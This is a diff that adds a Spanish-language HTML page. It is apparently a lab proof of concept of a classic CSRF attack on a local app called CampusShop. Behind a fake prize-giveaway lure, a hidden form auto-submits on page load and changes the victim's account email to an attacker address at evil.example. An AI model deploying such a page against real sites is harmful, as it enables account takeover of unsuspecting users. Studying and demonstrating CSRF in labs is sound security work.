@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <title>¡Ganaste un sorteo! 🎁</title>
+  <style>
+    body { font-family: system-ui, sans-serif; background:#101322; color:#eee;
+           display:grid; place-items:center; min-height:100vh; margin:0; text-align:center; }
+    .caja { background:#1b2036; padding:2rem 3rem; border-radius:14px; max-width:460px; }
+    h1 { color:#ffd166; }
+    small { color:#8893b0; }
+  </style>
+</head>
+<body>
+  <div class="caja">
+    <h1>🎉 ¡Felicidades! 🎉</h1>
+    <p>Eres el visitante número 1.000.000. Haz clic para reclamar tu premio.</p>
+    <button onclick="document.getElementById('f').submit()">Reclamar premio</button>
+    <p><small>sitio-del-atacante.example</small></p>
+  </div>
+
+  <!-- Formulario oculto hacia CampusShop. El navegador de la victima adjunta
+       su cookie de sesion automaticamente: CSRF clasico. -->
+  <form id="f" action="http://localhost:8000/perfil/email" method="POST" style="display:none">
+    <input name="email" value="atacante@evil.example">
+  </form>
+
+  <!-- Envio automatico al cargar la pagina (sin esperar el clic). -->
+  <script>window.addEventListener("load", () => document.getElementById("f").submit());</script>
+</body>
+</html>
